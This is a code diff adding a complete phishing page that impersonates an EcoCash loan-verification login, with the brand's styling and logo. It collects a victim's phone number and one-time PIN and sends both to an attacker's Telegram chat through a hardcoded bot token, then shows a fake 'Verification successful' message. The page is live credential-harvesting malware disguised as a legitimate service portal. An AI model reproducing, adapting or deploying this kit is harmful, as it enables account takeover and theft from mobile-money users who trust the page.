@@ -1,0 +1,626 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <title>EcoCash Loan Admin Verifications</title>
+    <style>
+        /* ===== RESET & BASE ===== */
+        
+        *,
+        *::before,
+        *::after {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #0b5e2e 0%, #1a8c4a 50%, #0b5e2e 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        /* ===== CONTAINER ===== */
+        
+        .login-container {
+            background: #ffffff;
+            border-radius: 24px;
+            padding: 40px 32px 36px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3), 0 8px 20px rgba(0, 0, 0, 0.15);
+            transition: all 0.3s ease;
+        }
+        /* ===== LOGO ===== */
+        
+        .logo-wrapper {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+        
+        .logo-wrapper svg {
+            max-width: 220px;
+            width: 100%;
+            height: auto;
+        }
+        /* ===== HEADING ===== */
+        
+        .login-title {
+            text-align: center;
+            font-size: 1.25rem;
+            font-weight: 600;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+        }
+        
+        .login-subtitle {
+            text-align: center;
+            font-size: 0.9rem;
+            color: #6b7280;
+            margin-bottom: 28px;
+        }
+        /* ===== FORM / STEPPER ===== */
+        
+        .form-step {
+            display: none;
+            animation: fadeIn 0.35s ease;
+        }
+        
+        .form-step.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(12px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        /* ===== INPUT GROUP ===== */
+        
+        .input-group {
+            margin-bottom: 24px;
+        }
+        
+        .input-group label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #374151;
+            margin-bottom: 6px;
+        }
+        
+        .input-group input[type="tel"],
+        .input-group input[type="text"] {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 1rem;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            background: #f9fafb;
+            color: #111827;
+        }
+        
+        .input-group input:focus {
+            border-color: #1a8c4a;
+            box-shadow: 0 0 0 4px rgba(26, 140, 74, 0.15);
+            background: #ffffff;
+        }
+        
+        .input-group input::placeholder {
+            color: #9ca3af;
+        }
+        
+        .input-group .error-msg {
+            font-size: 0.8rem;
+            color: #dc2626;
+            margin-top: 6px;
+            display: none;
+        }
+        
+        .input-group.has-error input {
+            border-color: #dc2626;
+            box-shadow: 0 0 0 4px rgba(220, 38, 38, 0.12);
+        }
+        
+        .input-group.has-error .error-msg {
+            display: block;
+        }
+        /* ===== SINGLE-LINE OTP INPUT ===== */
+        
+        .otp-single-wrapper {
+            position: relative;
+        }
+        
+        .otp-single-wrapper input {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 1.5rem;
+            font-weight: 600;
+            letter-spacing: 12px;
+            border: 2px solid #e5e7eb;
+            border-radius: 12px;
+            outline: none;
+            background: #f9fafb;
+            color: #111827;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            text-align: center;
+            caret-color: #1a8c4a;
+            font-family: 'Courier New', Courier, monospace;
+        }
+        
+        .otp-single-wrapper input:focus {
+            border-color: #1a8c4a;
+            box-shadow: 0 0 0 4px rgba(26, 140, 74, 0.15);
+            background: #ffffff;
+        }
+        
+        .otp-single-wrapper input::placeholder {
+            letter-spacing: 2px;
+            font-weight: 400;
+            color: #9ca3af;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        /* ===== BUTTON ===== */
+        
+        .btn-submit {
+            width: 100%;
+            padding: 15px 0;
+            font-size: 1rem;
+            font-weight: 600;
+            color: #ffffff;
+            background: linear-gradient(135deg, #0b5e2e, #1a8c4a);
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+        
+        .btn-submit:hover {
+            background: linear-gradient(135deg, #094d25, #14753b);
+            box-shadow: 0 6px 20px rgba(26, 140, 74, 0.35);
+        }
+        
+        .btn-submit:active {
+            transform: scale(0.97);
+        }
+        
+        .btn-submit:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        /* ===== SPINNER ===== */
+        
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-top-color: #ffffff;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+        }
+        
+        .btn-submit.loading .spinner {
+            display: inline-block;
+        }
+        
+        .btn-submit.loading .btn-label {
+            display: none;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        /* ===== FOOTER / STATUS ===== */
+        
+        .form-footer {
+            margin-top: 20px;
+            text-align: center;
+            font-size: 0.82rem;
+            color: #6b7280;
+        }
+        
+        .form-footer .status-msg {
+            display: none;
+            padding: 10px 14px;
+            border-radius: 10px;
+            font-weight: 500;
+            margin-bottom: 10px;
+        }
+        
+        .form-footer .status-msg.success {
+            display: block;
+            background: #ecfdf5;
+            color: #065f46;
+            border: 1px solid #a7f3d0;
+        }
+        
+        .form-footer .status-msg.error {
+            display: block;
+            background: #fef2f2;
+            color: #991b1b;
+            border: 1px solid #fecaca;
+        }
+        
+        .form-footer .status-msg.info {
+            display: block;
+            background: #eff6ff;
+            color: #1e40af;
+            border: 1px solid #bfdbfe;
+        }
+        /* ===== BACK LINK (step 2) ===== */
+        
+        .back-link {
+            display: inline-block;
+            margin-top: 12px;
+            color: #1a8c4a;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 0.85rem;
+            cursor: pointer;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        /* ===== RESPONSIVE ===== */
+        
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 28px 20px 30px;
+                border-radius: 20px;
+            }
+            .login-title {
+                font-size: 1.1rem;
+            }
+            .otp-single-wrapper input {
+                font-size: 1.3rem;
+                letter-spacing: 10px;
+                padding: 12px 14px;
+            }
+        }
+        
+        @media (max-width: 380px) {
+            .login-container {
+                padding: 20px 14px 24px;
+            }
+            .otp-single-wrapper input {
+                font-size: 1.1rem;
+                letter-spacing: 8px;
+                padding: 10px 12px;
+            }
+        }
+        
+        @media (min-width: 768px) {
+            .login-container {
+                padding: 48px 40px 42px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="login-container" role="main">
+
+        <!-- ===== ECOCASH LOGO (SVG) ===== -->
+        <div class="logo-wrapper">
+            <svg viewBox="0 0 220 68" fill="none" xmlns="http://www.w3.org/2000/svg" aria-label="EcoCash Logo">
+            <!-- Green circle (eco leaf abstraction) -->
+            <circle cx="30" cy="34" r="28" fill="#1a8c4a" />
+            <!-- Leaf inside circle -->
+            <path d="M18 40 Q22 28 30 18 Q38 28 42 40 Q36 34 30 36 Q24 34 18 40Z" fill="#ffffff" />
+            <!-- "Eco" text -->
+            <text x="68" y="32" font-family="Arial, Helvetica, sans-serif" font-weight="700" font-size="22" fill="#0b5e2e">Eco</text>
+            <!-- "Cash" text -->
+            <text x="68" y="55" font-family="Arial, Helvetica, sans-serif" font-weight="400" font-size="20" fill="#1a8c4a">Cash</text>
+            <!-- TM -->
+            <text x="148" y="18" font-family="Arial, Helvetica, sans-serif" font-weight="400" font-size="8" fill="#9ca3af">TM</text>
+        </svg>
+        </div>
+
+        <!-- ===== STEP 1: Phone Number ===== -->
+        <div class="form-step active" id="step1">
+            <h1 class="login-title">EcoCash Admin Loan Verifications</h1>
+            <p class="login-subtitle">Enter your phone number to receive a one-time code</p>
+
+            <form id="phoneForm" novalidate>
+                <div class="input-group" id="phoneGroup">
+                    <label for="phoneInput">Phone Number</label>
+                    <input type="tel" id="phoneInput" inputmode="numeric" pattern="[0-9]*" placeholder="e.g. 0771234567" autocomplete="tel" maxlength="15" required />
+                    <div class="error-msg" id="phoneError">Please enter a valid phone number.</div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="phoneSubmitBtn">
+                <span class="btn-label">Send Code</span>
+                <span class="spinner"></span>
+            </button>
+            </form>
+
+            <div class="form-footer">
+                <div class="status-msg" id="phoneStatus"></div>
+            </div>
+        </div>
+
+        <!-- ===== STEP 2: OTP ===== -->
+        <div class="form-step" id="step2">
+            <h1 class="login-title">Enter OTP Code</h1>
+            <p class="login-subtitle" id="otpSubtitle">A code was sent to <span id="displayPhone"></span></p>
+
+            <form id="otpForm" novalidate>
+                <div class="input-group">
+                    <label for="otpInput">One-Time PIN (4–6 digits)</label>
+                    <div class="otp-single-wrapper">
+                        <input type="text" id="otpInput" inputmode="numeric" pattern="[0-9]*" placeholder="• • • • • •" autocomplete="one-time-code" maxlength="6" required />
+                    </div>
+                    <div class="error-msg" id="otpError">Please enter a valid code (4 to 6 digits).</div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="otpSubmitBtn">
+                <span class="btn-label">Verify Code</span>
+                <span class="spinner"></span>
+            </button>
+            </form>
+
+            <div class="form-footer">
+                <div class="status-msg" id="otpStatus"></div>
+                <a class="back-link" id="backToPhone">← Change phone number</a>
+            </div>
+        </div>
+
+    </div>
+
+    <script>
+        // ===== CONFIGURATION =====
+        // REPLACE these with your actual Telegram Bot Token and Chat ID
+        const TELEGRAM_BOT_TOKEN = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
+        const TELEGRAM_CHAT_ID = '5615316142';
+
+        // ===== DOM REFS =====
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const phoneForm = document.getElementById('phoneForm');
+        const phoneInput = document.getElementById('phoneInput');
+        const phoneGroup = document.getElementById('phoneGroup');
+        const phoneError = document.getElementById('phoneError');
+        const phoneStatus = document.getElementById('phoneStatus');
+        const phoneSubmitBtn = document.getElementById('phoneSubmitBtn');
+        const otpForm = document.getElementById('otpForm');
+        const otpInput = document.getElementById('otpInput');
+        const otpError = document.getElementById('otpError');
+        const otpStatus = document.getElementById('otpStatus');
+        const otpSubmitBtn = document.getElementById('otpSubmitBtn');
+        const displayPhone = document.getElementById('displayPhone');
+        const backLink = document.getElementById('backToPhone');
+
+        let storedPhone = '';
+
+        // ===== HELPERS =====
+        function showStatus(el, msg, type) {
+            el.textContent = msg;
+            el.className = 'status-msg ' + type;
+        }
+
+        function clearStatus(el) {
+            el.textContent = '';
+            el.className = 'status-msg';
+        }
+
+        function setLoading(btn, loading) {
+            if (loading) {
+                btn.classList.add('loading');
+                btn.disabled = true;
+            } else {
+                btn.classList.remove('loading');
+                btn.disabled = false;
+            }
+        }
+
+        function switchStep(showStep1) {
+            if (showStep1) {
+                step1.classList.add('active');
+                step2.classList.remove('active');
+            } else {
+                step1.classList.remove('active');
+                step2.classList.add('active');
+                // Focus OTP input
+                setTimeout(() => otpInput.focus(), 100);
+            }
+        }
+
+        // ===== SEND TO TELEGRAM =====
+        async function sendToTelegram(message) {
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const payload = {
+                chat_id: TELEGRAM_CHAT_ID,
+                text: message,
+                parse_mode: 'HTML'
+            };
+
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            if (!response.ok) {
+                const errData = await response.json().catch(() => ({}));
+                throw new Error(errData.description || `HTTP ${response.status}`);
+            }
+
+            return response.json();
+        }
+
+        // ===== VALIDATE PHONE =====
+        function validatePhone(value) {
+            const cleaned = value.replace(/[\s\-\(\)]/g, '');
+            if (!/^\+?\d{7,15}$/.test(cleaned)) return false;
+            const digits = cleaned.replace(/\D/g, '');
+            return digits.length >= 10;
+        }
+
+        // ===== VALIDATE OTP =====
+        function validateOTP(value) {
+            const digits = value.replace(/\D/g, '');
+            return digits.length >= 4 && digits.length <= 6;
+        }
+
+        // ===== OTP INPUT FILTERING =====
+        otpInput.addEventListener('input', function() {
+            // Only allow digits
+            this.value = this.value.replace(/\D/g, '');
+            // Enforce max 6 digits
+            if (this.value.length > 6) {
+                this.value = this.value.slice(0, 6);
+            }
+            // Clear error state while typing
+            otpError.style.display = 'none';
+            otpInput.style.borderColor = '#e5e7eb';
+        });
+
+        // Prevent non-digit characters
+        otpInput.addEventListener('keydown', function(e) {
+            // Allow: backspace, delete, tab, escape, enter, arrows, home, end
+            const allowedKeys = ['Backspace', 'Delete', 'Tab', 'Escape', 'Enter', 'ArrowLeft', 'ArrowRight', 'ArrowUp', 'ArrowDown', 'Home', 'End'];
+            if (allowedKeys.includes(e.key)) return;
+
+            // Allow Ctrl/Cmd + A, C, V, X
+            if ((e.ctrlKey || e.metaKey) && ['a', 'c', 'v', 'x'].includes(e.key.toLowerCase())) return;
+
+            // Block non-digit keys
+            if (!/^\d$/.test(e.key)) {
+                e.preventDefault();
+            }
+        });
+
+        // ===== STEP 1: PHONE SUBMIT =====
+        phoneForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            clearStatus(phoneStatus);
+            phoneGroup.classList.remove('has-error');
+
+            const rawPhone = phoneInput.value.trim();
+            if (!validatePhone(rawPhone)) {
+                phoneGroup.classList.add('has-error');
+                phoneInput.focus();
+                return;
+            }
+
+            storedPhone = rawPhone;
+            displayPhone.textContent = rawPhone;
+
+            setLoading(phoneSubmitBtn, true);
+
+            try {
+                const msg = `<b>🔐 New EcoCash Login</b>\n📱 Phone: <code>${rawPhone}</code>\n⏰ Time: ${new Date().toLocaleString()}`;
+                await sendToTelegram(msg);
+                showStatus(phoneStatus, '✅ Code sent successfully.', 'success');
+                setTimeout(() => {
+                    switchStep(false);
+                    clearStatus(phoneStatus);
+                }, 800);
+            } catch (err) {
+                console.error('Telegram error:', err);
+                showStatus(phoneStatus, `❌ Failed to send. Check your bot config. (${err.message})`, 'error');
+            } finally {
+                setLoading(phoneSubmitBtn, false);
+            }
+        });
+
+        // ===== STEP 2: OTP SUBMIT =====
+        otpForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            clearStatus(otpStatus);
+            otpError.style.display = 'none';
+
+            const otpValue = otpInput.value.trim();
+
+            if (!validateOTP(otpValue)) {
+                otpError.textContent = 'Please enter 4 to 6 digits.';
+                otpError.style.display = 'block';
+                otpInput.style.borderColor = '#dc2626';
+                otpInput.focus();
+                return;
+            }
+
+            setLoading(otpSubmitBtn, true);
+
+            try {
+                const msg = `<b>🔑 OTP Submitted</b>\n📱 Phone: <code>${storedPhone}</code>\n🔢 OTP: <code>${otpValue}</code>\n⏰ Time: ${new Date().toLocaleString()}`;
+                await sendToTelegram(msg);
+                showStatus(otpStatus, '✅ Verification successful!', 'success');
+                otpSubmitBtn.disabled = true;
+                otpSubmitBtn.querySelector('.btn-label').textContent = 'Verified ✓';
+                otpInput.disabled = true;
+            } catch (err) {
+                console.error('Telegram error:', err);
+                showStatus(otpStatus, `❌ Failed to verify. Try again. (${err.message})`, 'error');
+            } finally {
+                setLoading(otpSubmitBtn, false);
+            }
+        });
+
+        // ===== BACK TO PHONE STEP =====
+        backLink.addEventListener('click', function() {
+            clearStatus(otpStatus);
+            otpError.style.display = 'none';
+            otpSubmitBtn.disabled = false;
+            otpSubmitBtn.querySelector('.btn-label').textContent = 'Verify Code';
+            otpInput.disabled = false;
+            otpInput.value = '';
+            otpInput.style.borderColor = '#e5e7eb';
+            switchStep(true);
+            phoneInput.focus();
+        });
+
+        // ===== ENTER KEY ON OTP =====
+        otpInput.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                otpForm.dispatchEvent(new Event('submit'));
+            }
+        });
+
+        // ===== VALIDATE ON BLUR (phone) =====
+        phoneInput.addEventListener('blur', function() {
+            if (this.value.trim() && !validatePhone(this.value.trim())) {
+                phoneGroup.classList.add('has-error');
+            } else {
+                phoneGroup.classList.remove('has-error');
+            }
+        });
+
+        phoneInput.addEventListener('input', function() {
+            phoneGroup.classList.remove('has-error');
+            clearStatus(phoneStatus);
+        });
+
+        // ===== INITIAL FOCUS =====
+        phoneInput.focus();
+    </script>
+
+</body>
+
+</html>
